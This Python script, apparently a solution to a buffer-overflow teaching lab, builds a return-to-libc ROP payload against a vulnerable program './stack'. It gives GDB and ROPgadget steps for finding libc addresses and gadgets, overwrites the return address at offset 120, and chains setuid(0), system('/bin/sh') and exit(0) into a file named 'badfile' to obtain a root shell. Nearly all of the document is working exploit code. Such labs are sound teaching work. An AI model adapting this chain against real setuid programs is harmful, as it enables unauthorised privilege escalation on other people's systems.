import sys

def to_bytes(value):
    return value.to_bytes(8, byteorder='little')

# The following addresses are determined by examining the libc mapping in GDB.
# Run these commands in GDB:
#   gdb ./stack
#   b foo
#   r
#   info proc mappings
# to find the address range of libc.
libc_addr = 0x7ffff7c00000

# In GDB, use commands like "p sprintf", "p setuid", "p system", "p exit" to get the
# addresses of the functions in libc.
sprintf_addr = 0x7ffff7c66420   # Address of 64-bit sprintf()
setuid_addr  = 0x7ffff7d0ea90   # Address of 64-bit setuid()
system_addr  = 0x7ffff7c58750   # Address of 64-bit system()
exit_addr    = 0x7ffff7c47ba0   # Address of 64-bit exit()

# Find "/bin/sh" in libc using:
#   find 0x7ffff7c00000, , "/bin/sh"
binsh_addr = 0x7ffff7dcb42f   # Address of the string "/bin/sh"
# Use the null terminator that immediately follows "/bin/sh" as our empty string.
null_addr = binsh_addr + len("/bin/sh")

# To search for useful gadgets, install ROPgadget using pipx:
#   sudo apt install pipx
#   pipx install ropgadget
#   pipx ensurepath
#
# Then use:
#   ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep -i "pop rdi"
#   ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep -i "pop rsi"
#   ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep -E "^0x[0-9a-f]+ : ret$"
#   ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "add rsp"
#
# The following gadgets are chosen based on that search:
pop_rdi_addr = 0x000000000010f75b + libc_addr    # "pop rdi; ret"
pop_rsi_rbp_addr = 0x000000000002b46b + libc_addr  # "pop rsi; pop rbp; ret"
ret_addr = 0x000000000002882f + libc_addr          # "ret" gadget

# A gadget that performs: "add rsp, 0x90; ret" (from the libc gadget list)
rsp_add = 0x0000000000045832 + libc_addr

# target_addr is the location in our stack payload where we want to store the zero value
# (later used for setuid argument). In our design, this is set to:
target_addr = 0x7fffffffec60

# Print out addresses for reference
print(f"{libc_addr=:x}")
print(f"{sprintf_addr=:x}")
print(f"{setuid_addr=:x}")
print(f"{system_addr=:x}")
print(f"{exit_addr=:x}")
print(f"{binsh_addr=:x}")
print(f"{pop_rdi_addr=:x}")
print(f"{pop_rsi_rbp_addr=:x}")
print(f"{ret_addr=:x}")
print(f"{rsp_add=:x}")
print(f"{null_addr=:x}")
print(f"{target_addr=:x}")

# Define the offset from the start of the vulnerable buffer (in foo) to the saved return address.
offset = 120

# Fill the buffer up to the saved return address.
content = b"A" * offset

# Overwrite the saved return address with the address of our rsp gadget.
# When the vulnerable function returns, it will jump to rsp_add (gadget in libc).
content += to_bytes(rsp_add)

# Fill additional padding bytes (24 bytes) so that after the gadget executes,
# the stack pointer (rsp) points to our controlled ROP chain area.
content += b"B" * 24

# The following loop is a commented-out example that would repeatedly call sprintf
# to zero out a memory area. In this version it is not used.
# However, if you uncomment this loop, the exploit still works.
# This loop is an excellent way to learn how gadgets function.
# for i in range(0, 8):
#     content += to_bytes(pop_rsi_rbp_addr)
#     content += to_bytes(null_addr)               # Set rsi = address of a null byte (empty string)
#     content += to_bytes(0xdeadbeefdeadbeef)        # Dummy value for rbp (placeholder)
#     content += to_bytes(pop_rdi_addr)
#     content += to_bytes(target_addr + i)           # Set rdi = target_addr + i (to write one byte at a time)
#     content += to_bytes(sprintf_addr)              # Call sprintf(target_addr+i, null_addr)

# Build the ROP chain to call setuid(0)
# First, we set rdi to 0. In this example, we directly use 0.
content += to_bytes(pop_rdi_addr)
content += to_bytes(0x0)        # rdi = 0; this will be used as the argument for setuid()
content += to_bytes(setuid_addr)

# Build the ROP chain to call system("/bin/sh") and then exit(0)
content += to_bytes(pop_rdi_addr)
content += to_bytes(binsh_addr)  # rdi = address of "/bin/sh"
content += to_bytes(system_addr)
content += to_bytes(pop_rdi_addr)
content += to_bytes(0)           # rdi = 0 for exit()
content += to_bytes(exit_addr)

# Print out the final payload (in bytes) for inspection.
print(content)

# Write the payload to file "badfile"
with open("badfile", "wb") as f:
    f.write(content)
